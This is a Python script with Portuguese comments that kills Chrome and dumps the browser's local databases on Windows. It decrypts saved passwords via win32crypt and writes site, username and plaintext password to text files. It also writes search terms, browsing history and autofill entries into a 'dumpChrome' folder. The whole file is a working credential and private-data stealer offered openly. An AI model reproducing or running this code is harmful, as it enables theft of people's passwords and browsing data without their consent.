from __future__ import print_function
import os
from os import getenv
import sqlite3
import win32crypt
import sys
import subprocess

siteId = "Site: "
username1 = "Username: "
password_field = "Password: "

# fecha todo o google chrome ... isso é necessario devido a conflitos de acesso concorrente a base sqlLite. :)
os.system("taskkill /f /im  chrome.exe")

# cria um diretorio para armazenar o dump caso este ainda n exista
try:
        os.mkdir("dumpChrome")
except:
        pass


try:
        # getenv("APPDATA") busca pelo diretorio do %APPDATA% 
        conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        conn3 = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\History")
        conn1 = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\Web Data")
        conn4 = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\Web Data")

        # cursores de leitura em cada arquivo do sqlLite
        cursor3 = conn3.cursor()
        cursor1 = conn1.cursor()
        cursor4 = conn4.cursor()
        cursor = conn.cursor()
        
        # Dump das senhas de sites no google chrome no arquivo "pass_and_users.txt"
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        f = open(".\\dumpChrome\\pass_and_users.txt", "w")
        f.writelines(" ---- Passwords and Usernames Google Chrome ---- \n \n")
        for res in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(res[2], None, None, None, 0)[1]
                if password:
                        
                        f.writelines(str(siteId) + str(res[0]) + '\n' + str(username1) + str(res[1]) + '\n' + str(password_field) + str(password)[2:-1])
                        f.writelines('\n' + '--------------------------------' + '\n')
        f.close()

        # Dump das palavras pesquisadas no google chrome no arquivo "palavras_pesquisadas.txt"
        cursor3.execute("SELECT * FROM keyword_search_terms") 
        f = open(".\\dumpChrome\\palavras_pesquisadas.txt", "w")		
        f.writelines(" ---- Keyword Search Google Chrome ---- \n \n")
        for r3 in cursor3.fetchall():
                f.writelines(str(r3[2] + "\n"))
        f.close()       
                
        # Dump do historico no google chrome no arquivo "hitorico.txt"
        f = open(".\\dumpChrome\\historico.txt", "w")
        f.writelines(" ---- History Google Chrome ---- \n \n")
        cursor3.execute("SELECT * FROM urls") 
        for r4 in cursor3.fetchall():
                f.writelines(str('\n' + r4[1] + '\n'))
        f.close()       

        # Dump de campos salvos google chrome no arquivo "campos_salvos.txt"
        f = open(".\\dumpChrome\\campos_salvos.txt", "w") 
        cursor4.execute("SELECT * FROM autofill")
        for r6 in cursor4.fetchall():
                f.writelines(str('\n' + r6[0] + ":    "+ r6[2]))
        f.close()    
except:
        print("Porfavor desligue o google chrome.")